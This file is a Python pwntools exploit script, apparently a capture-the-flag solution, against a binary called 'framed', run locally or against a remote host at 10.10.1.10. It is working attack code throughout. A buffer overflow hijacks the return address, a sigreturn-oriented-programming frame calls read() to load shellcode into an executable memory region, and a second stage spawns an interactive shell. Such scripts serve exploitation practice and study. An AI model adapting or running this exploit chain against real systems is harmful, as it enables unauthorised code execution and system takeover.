from time import sleep
from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, SigreturnFrame, shellcraft, asm, context

context.arch='amd64'

LOCAL_BIN = "./framed"
LOCAL = True
GDB = False

BIN = ELF(LOCAL_BIN)

if LOCAL:
    P = process(LOCAL_BIN)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
    if GDB:
        gdb.attach(P.pid, """
br *(_start+21)
br 0x42800
display/i $pc
c
""")
else:
    P = remote('10.10.1.10',27307)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

# P.sendline(cyclic(20))

POP_RAX_RET = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]
SYSCALL_RET = (ROP_LOADED.find_gadget(['syscall', 'ret']))[0]
RWE_ADDR = 0x42800 # rwe address
EXECVE = 59
READ = 0
SIGRETURN = 15

sc = ""
sc += "\t"+"add rsp, 0x100"+"\n"
sc += shellcraft.amd64.sh()
print(sc)
stage2 = p64(RWE_ADDR+8)+asm(sc)

log.info("pop rax; ret gadget: " + hex(POP_RAX_RET))
log.info("syscall; ret gadget: " + hex(SYSCALL_RET))
 
frame = SigreturnFrame(kernel="amd64")
frame.rax = READ
frame.rdi = 0 # unsigned int fd, stdin
frame.rsi = RWE_ADDR # char *buf
frame.rdx = len(stage2) # size_t count
frame.rsp = RWE_ADDR
frame.rip = SYSCALL_RET

rip_offset = cyclic_find(0x61616164)

payload = b"\x90" * rip_offset + p64(POP_RAX_RET)
payload += p64(SIGRETURN)
payload += p64(SYSCALL_RET)
payload += bytes(frame)


stage1 = payload + b"B"*(0x539-len(payload))
P.send(stage1)
P.send(stage2)

P.interactive()